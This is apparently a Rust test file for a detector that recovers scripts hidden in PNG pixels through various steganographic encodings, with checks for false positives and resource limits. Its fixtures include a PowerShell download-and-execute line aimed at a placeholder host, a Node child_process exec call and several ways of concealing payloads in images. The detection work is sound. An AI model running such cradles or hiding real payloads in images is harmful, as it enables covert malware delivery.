use super::*;
use std::io::Write;

const SCRIPT: &[u8] = b"#!/bin/sh\nprintf '%s\\n' 'pixel payload regression'\nid\nuname -a\n";
const WIDTH: usize = 128;
const HEIGHT: usize = 128;

fn cover(channels: usize) -> Vec<u8> {
    let mut pixels = Vec::new();
    for y in 0..HEIGHT {
        for x in 0..WIDTH {
            let color = [
                u8::try_from(x * 2).unwrap(),
                u8::try_from(y * 2).unwrap(),
                u8::try_from(x + y).unwrap(),
                255,
            ];
            pixels.extend_from_slice(&color[..channels]);
        }
    }
    pixels
}

fn hide(
    payload: &[u8],
    channels: usize,
    offsets: &[usize],
    plane: u8,
    column: bool,
    prime: bool,
) -> Vec<u8> {
    let mut pixels = cover(channels);
    let primes = prime_sieve(WIDTH * HEIGHT);
    let mut bits = payload
        .iter()
        .chain(std::iter::once(&0))
        .flat_map(|byte| (0..8).rev().map(move |b| (byte >> b) & 1));
    for (index, &is_prime) in primes.iter().enumerate() {
        if prime && !is_prime {
            continue;
        }
        let pixel = if column {
            (index % HEIGHT) * WIDTH + index / HEIGHT
        } else {
            index
        };
        for &channel in offsets {
            let Some(bit) = bits.next() else {
                return pixels;
            };
            let value = &mut pixels[pixel * channels + channel];
            *value = (*value & !(1 << plane)) | (bit << plane);
        }
    }
    panic!("test payload exceeded carrier capacity");
}

fn probe(pixels: &[u8], channels: usize) -> (Values, Metrics) {
    let (mut values, mut metrics) = (Values::new(), Metrics::new());
    extract(
        pixels,
        WIDTH,
        HEIGHT,
        channels,
        "u8",
        &mut values,
        &mut metrics,
    );
    (values, metrics)
}

fn kinds(values: &Values) -> Vec<&str> {
    values
        .get("png.pixel_payloads")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(|v| v.get("kind").and_then(Value::as_str))
        .collect()
}

#[test]
fn reconstructs_sequential_prime_and_second_bit_scripts() {
    for (offsets, plane, column, prime) in [
        (&[0, 1, 2][..], 0, false, false),
        (&[2, 1, 0][..], 0, true, true),
        (&[0][..], 1, false, false),
    ] {
        let pixels = hide(SCRIPT, 3, offsets, plane, column, prime);
        let (values, metrics) = probe(&pixels, 3);
        assert!(kinds(&values).contains(&"shell"), "{values:?}");
        assert_eq!(metrics.get("png.pixel_payload_count"), Some(1.0));
        assert!(
            values
                .get("png.pixel_payloads")
                .unwrap()
                .to_string()
                .contains("pixel payload regression")
        );
    }
}

#[test]
fn validates_stegano_length_framed_base64_and_shifted_script() {
    let encoded = STANDARD.encode(SCRIPT);
    let framed = format!("{}:{encoded}", encoded.len());
    let (values, _) = probe(&hide(framed.as_bytes(), 3, &[0, 1, 2], 0, false, false), 3);
    assert!(kinds(&values).contains(&"shell"));
    let payload = [vec![0; 32], SCRIPT.to_vec()].concat();
    let (values, _) = probe(&hide(&payload, 3, &[0, 1, 2], 0, false, false), 3);
    assert!(kinds(&values).contains(&"shell"));
}

#[test]
fn reconstructs_direct_channel_bytes_and_transparent_rgb() {
    let mut pixels = cover(4);
    for (byte, target) in SCRIPT.iter().zip(pixels.iter_mut()) {
        *target = *byte;
    }
    let (values, _) = probe(&pixels, 4);
    assert!(kinds(&values).contains(&"shell"));
    let mut pixels = cover(4);
    for (pixel, bytes) in pixels
        .as_chunks_mut::<4>()
        .0
        .iter_mut()
        .zip(SCRIPT.chunks(3))
    {
        pixel[3] = 0;
        pixel[..bytes.len()].copy_from_slice(bytes);
    }
    let (values, _) = probe(&pixels, 4);
    assert!(kinds(&values).contains(&"shell"));
    assert!(
        values
            .get("png.pixel_payloads")
            .unwrap()
            .to_string()
            .contains("transparent-rgb")
    );
}

#[test]
fn checks_checksums_before_accepting_compressed_payload() {
    let mut encoder = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
    encoder.write_all(SCRIPT).unwrap();
    let compressed = encoder.finish().unwrap();
    assert_eq!(decompress(&compressed).unwrap(), SCRIPT);
    assert!(decompress(&compressed[..compressed.len() - 1]).is_none());
    let mut corrupted = compressed.clone();
    *corrupted.last_mut().unwrap() ^= 1;
    assert!(decompress(&corrupted).is_none());
    for payload in [
        compressed.clone(),
        STANDARD.encode(&compressed).into_bytes(),
    ] {
        let (values, _) = probe(&hide(&payload, 3, &[0, 1, 2], 0, false, false), 3);
        assert!(kinds(&values).contains(&"shell"));
    }
}

#[test]
fn compression_bomb_and_weak_headers_do_not_make_payload_facts() {
    let mut encoder = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::best());
    encoder.write_all(&vec![b'A'; MAX_DECODED + 1]).unwrap();
    assert!(decompress(&encoder.finish().unwrap()).is_none());
    for data in [
        b"MZ....not a portable executable".as_slice(),
        b"PK\x03\x04bad archive",
        b"#!/logo/image.png\nordinary metadata text",
    ] {
        assert!(content(data).is_none());
    }
}

#[test]
fn ordinary_gradients_noise_and_flat_pixels_are_not_recovered_payloads() {
    for channels in [1, 2, 3, 4] {
        assert!(kinds(&probe(&cover(channels), channels).0).is_empty());
    }
    let mut state = 0x12345678u32;
    let noise: Vec<u8> = (0..WIDTH * HEIGHT * 3)
        .map(|_| {
            state ^= state << 13;
            state ^= state >> 17;
            state ^= state << 5;
            state as u8
        })
        .collect();
    assert!(kinds(&probe(&noise, 3).0).is_empty());
    for byte in [0, b'c', 128, 255] {
        assert!(kinds(&probe(&vec![byte; WIDTH * HEIGHT * 3], 3).0).is_empty());
    }
}

#[test]
fn simple_other_languages_and_utf16_are_recognized() {
    for (text, kind) in [
        ("import os\nos.system('printf fixture')\n", "python"),
        (
            "const cp = require('child_process'); cp.exec('id');\n",
            "javascript",
        ),
        (
            "$x = New-Object Net.WebClient; IEX($x.DownloadString('https://example.invalid/fixture'));",
            "powershell",
        ),
    ] {
        assert_eq!(content(text.as_bytes()).unwrap().0, kind);
        let units: Vec<u8> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let (values, _) = probe(&hide(&units, 3, &[0, 1, 2], 0, false, false), 3);
        assert!(kinds(&values).contains(&kind));
    }
}

#[test]
fn bounds_and_malformed_dimensions_are_observable() {
    let (mut values, mut metrics) = (Values::new(), Metrics::new());
    extract(
        &[],
        usize::MAX,
        usize::MAX,
        4,
        "u8",
        &mut values,
        &mut metrics,
    );
    assert!(values.get("png.limits").is_some());
    let pixels = vec![0; 1024 * 1024 * 3];
    extract(&pixels, 1024, 1024, 3, "u8", &mut values, &mut metrics);
    assert!(metrics.get("png.pixel_payload_probe_steps").unwrap() <= (MAX_STEPS + 1) as f64);
    assert_eq!(metrics.get("png.pixel_payload_limited"), Some(1.0));
    assert!(kinds(&values).is_empty());
}

#[test]
fn full_png_pipeline_recovers_low_bit_payload() {
    let pixels = hide(SCRIPT, 3, &[0, 1, 2], 0, false, false);
    let mut data = Vec::new();
    {
        let mut encoder = png::Encoder::new(&mut data, WIDTH as u32, HEIGHT as u32);
        encoder.set_color(png::ColorType::Rgb);
        encoder.set_depth(png::BitDepth::Eight);
        encoder
            .write_header()
            .unwrap()
            .write_image_data(&pixels)
            .unwrap();
    }
    let (mut values, mut metrics, mut strings) = (
        Values::new(),
        Metrics::new(),
        crate::output::Strings::default(),
    );
    super::super::png::extract(&data, &mut values, &mut strings, &mut metrics);
    assert!(kinds(&values).contains(&"shell"));
}

#[test]
fn simple_xor_and_hex_wrappers_preserve_script_evidence() {
    let xor: Vec<u8> = SCRIPT.iter().map(|b| b ^ 0x5a).collect();
    let hex: String = SCRIPT.iter().map(|b| format!("{b:02x}")).collect();
    for payload in [xor, hex.into_bytes()] {
        let (values, _) = probe(&hide(&payload, 3, &[0, 1, 2], 0, false, false), 3);
        assert!(kinds(&values).contains(&"shell"));
    }
}

#[test]
fn palette_samples_and_sixteen_bit_lanes_are_decoded_before_probing() {
    let hidden = hide(SCRIPT, 3, &[0], 0, false, false);
    for sixteen in [false, true] {
        let mut data = Vec::new();
        {
            let mut encoder = png::Encoder::new(&mut data, WIDTH as u32, HEIGHT as u32);
            let samples = if sixteen {
                encoder.set_color(png::ColorType::Rgb);
                encoder.set_depth(png::BitDepth::Sixteen);
                hidden
                    .iter()
                    .flat_map(|&low| [128, low])
                    .collect::<Vec<_>>()
            } else {
                encoder.set_color(png::ColorType::Indexed);
                encoder.set_depth(png::BitDepth::Eight);
                encoder.set_palette((0..=255u8).flat_map(|v| [v, v, v]).collect::<Vec<_>>());
                hidden
                    .as_chunks::<3>()
                    .0
                    .iter()
                    .map(|p| p[0])
                    .collect::<Vec<_>>()
            };
            encoder
                .write_header()
                .unwrap()
                .write_image_data(&samples)
                .unwrap();
        }
        let (mut values, mut metrics, mut strings) = (
            Values::new(),
            Metrics::new(),
            crate::output::Strings::default(),
        );
        super::super::png::extract(&data, &mut values, &mut strings, &mut metrics);
        assert!(kinds(&values).contains(&"shell"));
        assert_eq!(metrics.get("image.channels"), Some(3.0));
        if sixteen {
            assert_eq!(metrics.get("image.pixel_entropy"), Some(0.0));
        }
    }
}

#[test]
fn structured_configuration_is_interesting_without_a_script() {
    for (bytes, kind) in [
        (
            br#"{"server":"https://stage.example.invalid/update","delay":30}"#.as_slice(),
            "json",
        ),
        (b"https://stage.example.invalid/update".as_slice(), "url"),
    ] {
        let (values, _) = probe(&hide(bytes, 3, &[0, 1, 2], 0, false, false), 3);
        assert!(kinds(&values).contains(&kind));
    }
}

#[test]
fn large_binary_payload_keeps_header_evidence_when_tables_are_beyond_prefix() {
    let mut header = vec![0u8; 64];
    header[..7].copy_from_slice(b"\x7fELF\x02\x01\x01");
    header[16..18].copy_from_slice(&2u16.to_le_bytes());
    header[18..20].copy_from_slice(&62u16.to_le_bytes());
    header[20..24].copy_from_slice(&1u32.to_le_bytes());
    header[40..48].copy_from_slice(&8192u64.to_le_bytes());
    header[52..54].copy_from_slice(&64u16.to_le_bytes());
    header[58..60].copy_from_slice(&64u16.to_le_bytes());
    header[60..62].copy_from_slice(&1u16.to_le_bytes());
    assert_eq!(content(&header).unwrap().0, "elf-header");
}

#[test]
fn reverse_pixel_directions_recover_simple_scripts() {
    let ordinary = hide(SCRIPT, 3, &[0, 1, 2], 0, false, false);
    for (flip_x, flip_y) in [(true, true), (true, false), (false, true)] {
        let pixels: Vec<u8> = (0..HEIGHT)
            .flat_map(|y| {
                let ordinary = &ordinary;
                (0..WIDTH).flat_map(move |x| {
                    let xx = if flip_x { WIDTH - 1 - x } else { x };
                    let yy = if flip_y { HEIGHT - 1 - y } else { y };
                    ordinary[(yy * WIDTH + xx) * 3..(yy * WIDTH + xx) * 3 + 3]
                        .iter()
                        .copied()
                })
            })
            .collect();
        let (values, _) = probe(&pixels, 3);
        assert!(kinds(&values).contains(&"shell"));
    }
}
